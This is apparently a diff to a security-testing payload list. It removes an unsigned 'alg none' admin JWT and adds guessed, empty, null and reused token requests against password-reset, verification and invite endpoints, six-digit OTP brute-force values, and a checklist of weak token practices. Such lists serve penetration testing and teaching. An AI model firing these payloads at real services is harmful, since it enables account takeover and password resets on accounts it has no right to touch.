@@ -1,1 +1,54 @@
-eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.
+GET /api/reset?token=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+GET /api/reset?token=0000000000000000000000000000000000000000
+GET /api/reset?token=1111111111111111111111111111111111111111
+GET /api/reset?token=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+GET /api/reset?token=00000001
+GET /api/reset?token=00000002
+GET /api/reset?token=00000003
+GET /api/reset?token=00000010
+GET /api/reset?token=0000000000000001
+GET /api/reset?token=0000000000000002
+GET /api/reset?token=0000000000000003
+GET /api/verify-email?token=0000000000000001
+GET /api/verify-email?token=0000000000000002
+GET /api/activate?token=0000000000000001
+GET /api/activate?token=0000000000000002
+GET /api/confirm?token=0000000000000001
+GET /api/confirm?token=0000000000000002
+GET /api/invite/accept?token=0000000000000001
+GET /api/invite/accept?token=0000000000000002
+GET /api/unsubscribe?token=0000000000000001
+GET /api/unsubscribe?token=0000000000000002
+POST /api/reset {"token":"","new_password":"hacked"}
+POST /api/reset {"token":null,"new_password":"hacked"}
+POST /api/reset {"token":"expired_token","new_password":"hacked"}
+POST /api/reset {"token":"used_token","new_password":"hacked"}
+POST /api/reset {"token":"other_user_token","new_password":"hacked"}
+POST /api/verify {"token":"intercepted_token"}
+POST /api/activate {"token":"guessed_token"}
+PUT /api/password-reset {"reset_token":"weak_token","password":"hacked"}
+PATCH /api/user/password {"token":"short_token","password":"hacked"}
+GET /api/reset?token=md5(email+timestamp) (predictable)
+GET /api/reset?token=base64(email:timestamp) (predictable)
+GET /api/reset?token=sha1(username) (predictable)
+GET /api/reset?token=user_id+timestamp (predictable)
+GET /api/reset?token=username+random_4digits (brute-forceable)
+GET /api/reset?token=6digit_otp (100000 possibilities)
+GET /api/reset?token=000000 (OTP brute force)
+GET /api/reset?token=000001
+GET /api/reset?token=000002
+GET /api/reset?token=123456
+GET /api/reset?token=111111
+GET /api/reset?token=999999
+Token in URL visible in server logs
+Token in Referer header leakage
+Token in email visible in mail server logs
+Token not invalidated after use
+Token not invalidated after password change
+Token not invalidated after logout
+Token with very long expiry (days/weeks)
+Token reusable across different users
+Token length too short (under 16 bytes)
+Token not random (PRNG not CSPRNG)
+Token predictable via timing analysis
+Token transmitted over HTTP (not HTTPS)
